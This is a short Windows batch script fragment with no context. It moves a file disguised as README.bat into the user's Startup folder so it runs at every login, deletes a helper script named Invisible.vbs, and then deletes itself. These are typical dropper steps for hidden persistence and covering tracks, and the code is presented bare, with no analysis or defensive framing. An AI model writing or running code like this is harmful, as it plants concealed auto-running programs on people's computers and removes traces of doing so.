move /y README.bat "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
del "Invisible.vbs"
(goto) 2>nul & del "%~f0"